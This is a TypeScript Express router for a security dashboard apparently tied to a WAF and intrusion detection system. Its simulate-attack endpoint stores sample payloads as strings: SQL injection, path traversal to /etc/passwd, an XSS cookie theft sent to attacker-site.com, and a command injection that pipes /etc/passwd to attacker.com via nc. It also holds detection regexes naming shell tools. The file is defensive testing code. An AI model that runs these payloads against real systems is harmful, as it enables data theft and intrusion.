import { Router, Request, Response } from 'express';
import {
  securityStats,
  securityIncidents,
  blockedIps,
  blockIp,
  unblockIp,
  logSecurityIncident,
  GOOGLE_CLIENT_ID
} from '../security_guard.js';
import { catatNotifikasi } from '../store.js';

const router = Router();

// ============================================================================
// 1. STATISTIK KEAMANAN SISTEM & METRIK DETEKSI ANCAMAN
// ============================================================================
router.get(['/stats', '/api/security/stats'], (_req: Request, res: Response) => {
  const activeBlockedIps = Array.from(blockedIps.values()).filter(
    b => b.expires_at > Date.now()
  );

  // Hitung status ancaman
  let overallThreatStatus = 'AMAN';
  let threatColor = '#10b981'; // Green
  const recentCritical = securityIncidents.slice(0, 20).filter(i => i.threat_level === 'CRITICAL').length;
  const recentHigh = securityIncidents.slice(0, 20).filter(i => i.threat_level === 'HIGH').length;

  if (recentCritical > 0 || activeBlockedIps.length > 3) {
    overallThreatStatus = 'SIAGA TINGGI (SERANGAN CRITICAL DIBLOKIR)';
    threatColor = '#ef4444'; // Red
  } else if (recentHigh > 0 || activeBlockedIps.length > 0) {
    overallThreatStatus = 'WASPADA (AKTIVITAS MENCURIGAKAN DIBLOKIR)';
    threatColor = '#f59e0b'; // Amber
  }

  res.json({
    status: 'success',
    timestamp: new Date().toISOString(),
    engine: {
      name: 'Sidoarjo Cyber Shield Enterprise WAF & IDS',
      version: '3.2.0-secure',
      status: 'AKTIF & MEMANTAU',
      started_at: securityStats.engineStartedAt
    },
    threat_status: {
      status_label: overallThreatStatus,
      status_color: threatColor,
      total_inspected: securityStats.totalRequestsInspected,
      total_blocked: securityStats.totalAttacksBlocked,
      active_quarantined_ips: activeBlockedIps.length
    },
    attack_breakdown: securityStats.attacksByType,
    protections_active: [
      'SQL Injection Filter (Prepared Statements & Regex Defense)',
      'Cross-Site Scripting (XSS Sanitizer & CSP)',
      'Command Injection / Remote Code Execution (RCE) Guard',
      'Path Traversal & Local File Inclusion (LFI) Blocker',
      'Brute Force Rate Limiter & IP Lockout',
      'Webshell & Executable Uploads Quarantine',
      'Reconnaissance Bot & Scanner Detector',
      'HMAC-SHA256 Cryptographic JWT Security'
    ]
  });
});

// ============================================================================
// 2. DAFTAR LOG INSIDEN SERANGAN (AUDIT TRAIL UNTUK DEVELOPER)
// ============================================================================
router.get(['/attacks', '/api/security/attacks'], (req: Request, res: Response) => {
  const limit = Math.min(200, Math.max(1, Number(req.query.limit) || 50));
  const filterType = req.query.type ? String(req.query.type).toUpperCase() : null;
  const filterLevel = req.query.level ? String(req.query.level).toUpperCase() : null;

  let results = [...securityIncidents];
  if (filterType) {
    results = results.filter(i => i.attack_type === filterType);
  }
  if (filterLevel) {
    results = results.filter(i => i.threat_level === filterLevel);
  }

  res.json({
    status: 'success',
    total_logged: securityIncidents.length,
    returned: Math.min(results.length, limit),
    incidents: results.slice(0, limit)
  });
});

// ============================================================================
// 3. DAFTAR IP TERBLOKIR / TERKARANTINA
// ============================================================================
router.get(['/blocked-ips', '/api/security/blocked-ips'], (_req: Request, res: Response) => {
  const now = Date.now();
  const list = Array.from(blockedIps.values())
    .filter(b => b.expires_at > now)
    .map(b => ({
      ...b,
      remaining_seconds: Math.max(0, Math.round((b.expires_at - now) / 1000)),
      remaining_minutes: Math.max(0, Math.ceil((b.expires_at - now) / 60000))
    }));

  res.json({
    status: 'success',
    count: list.length,
    data: list
  });
});

// ============================================================================
// 4. MANUAL BLOCK & UNBLOCK IP (KONTROL DEVELOPER)
// ============================================================================
router.post(['/block-ip', '/api/security/block-ip'], (req: Request, res: Response) => {
  const d = req.body || {};
  const ip = String(d.ip || '').trim();
  const reason = String(d.reason || 'Diblokir manual oleh Administrator').trim();
  const duration = Number(d.duration_minutes) || 60;

  if (!ip) {
    return res.status(400).json({ status: 'error', message: 'Alamat IP wajib diisi.' });
  }

  blockIp(ip, reason, duration);
  catatNotifikasi(`Alamat IP ${ip} berhasil dimasukkan ke daftar blokir selama ${duration} menit.`, 'Keamanan', 'urgent');

  res.json({
    status: 'success',
    message: `IP ${ip} berhasil diblokir selama ${duration} menit.`,
    ip,
    reason
  });
});

router.post(['/unblock-ip', '/api/security/unblock-ip'], (req: Request, res: Response) => {
  const d = req.body || {};
  const ip = String(d.ip || '').trim();

  if (!ip) {
    return res.status(400).json({ status: 'error', message: 'Alamat IP wajib diisi.' });
  }

  const success = unblockIp(ip);
  if (success) {
    catatNotifikasi(`Alamat IP ${ip} telah dibebaskan dari karantina oleh Administrator.`, 'Keamanan', 'info');
  }

  res.json({
    status: success ? 'success' : 'info',
    message: success ? `Blokir IP ${ip} berhasil dicabut.` : `IP ${ip} tidak ditemukan dalam daftar blokir aktif.`
  });
});

// ============================================================================
// 5. UJI SIMULASI SERANGAN SIBER (UNTUK PENGUJIAN OLEH DEVELOPER)
// ============================================================================
router.post(['/simulate-attack', '/api/security/simulate-attack'], (req: Request, res: Response) => {
  const d = req.body || {};
  const attackType = String(d.type || 'SQL_INJECTION').toUpperCase();
  const simulatedIp = String(d.simulated_ip || '203.0.113.199'); // Contoh IP simulasi testnet

  let payload = '';
  let rule = '';
  let threatLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' = 'HIGH';
  let desc = '';

  if (attackType === 'SQL_INJECTION') {
    payload = "' UNION SELECT null, username, password FROM users WHERE '1'='1' --";
    rule = '/(\\b(union(\\s+all)?\\s+select)\\b)/i';
    threatLevel = 'CRITICAL';
    desc = 'Simulasi upaya penarikan data pengguna melalui teknik SQL Injection.';
  } else if (attackType === 'XSS') {
    payload = '<script>fetch("https://attacker-site.com/steal?cookie="+document.cookie)</script>';
    rule = '/<\\s*script[^>]*>/i';
    threatLevel = 'HIGH';
    desc = 'Simulasi injeksi script Cross-Site Scripting (XSS) untuk pencurian sesi.';
  } else if (attackType === 'COMMAND_INJECTION') {
    payload = '; rm -rf /var/log && cat /etc/passwd | nc attacker.com 4444';
    rule = '/;\\s*(rm\\s+-rf|curl|wget|bash\\s+-i|nc\\s+-e)/i';
    threatLevel = 'CRITICAL';
    desc = 'Simulasi percobaan injeksi perintah shell sistem operasi (Remote Code Execution).';
  } else if (attackType === 'PATH_TRAVERSAL') {
    payload = '../../../../etc/passwd%00.jpg';
    rule = '/(\\.\\.\\/|\\.\\.\\\\|%2e%2e%2f)/i';
    threatLevel = 'HIGH';
    desc = 'Simulasi upaya pembacaan berkas konfigurasi sistem melalui Path Traversal.';
  } else if (attackType === 'RECON_SCANNER') {
    payload = 'GET /wp-login.php HTTP/1.1 (Automated Bot Probe)';
    rule = '/wp-login\\.php/i';
    threatLevel = 'MEDIUM';
    desc = 'Simulasi probing bot otomatis pencari kerentanan CMS.';
  } else {
    payload = 'Simulated automated rapid failed logins (Brute Force)';
    rule = 'Rate Limit Threshold Exceeded';
    threatLevel = 'MEDIUM';
    desc = 'Simulasi serangan brute force / penembakan password massal.';
  }

  const incident = logSecurityIncident({
    ip: simulatedIp,
    method: 'POST',
    path: '/api/security/simulate-attack',
    attack_type: attackType as any,
    threat_level: threatLevel,
    matched_rule: rule,
    payload_sample: payload,
    user_agent: 'Sidoarjo Cyber Lab Simulation Engine v1.0',
    status: 'BLOCKED',
    action_taken: `Simulasi uji penyerangan: ${desc} Berhasil dideteksi dan dinetralkan.`
  });

  res.json({
    status: 'success',
    simulated: true,
    message: `Uji simulasi serangan ${attackType} berhasil! Sistem pertahanan langsung mendeteksi dan memblokir serangan secara instan.`,
    incident
  });
});

// ============================================================================
// 6. CLEAR LOGS (PEMBERSIHAN LOG BERKALA OLEH DEVELOPER)
// ============================================================================
router.post(['/clear-logs', '/api/security/clear-logs'], (_req: Request, res: Response) => {
  securityIncidents.length = 0;
  res.json({
    status: 'success',
    message: 'Seluruh riwayat log insiden keamanan telah berhasil diarsipkan dan dibersihkan.'
  });
});

// ============================================================================
// 7. PUBLIC SAFE CONFIG (MENYEDIAKAN KONFIGURASI AMAN TANPA MEMBUKA KODE RAHASIA)
// ============================================================================
router.get(['/public-config', '/api/security/public-config'], (_req: Request, res: Response) => {
  res.json({
    status: 'success',
    oauth: {
      google_client_id: GOOGLE_CLIENT_ID
    },
    security: {
      waf_active: true,
      waf_mode: 'STRICT_BLOCK',
      rate_limiting: true,
      file_quarantine: true,
      encryption_standard: 'HMAC-SHA256'
    }
  });
});

export default router;
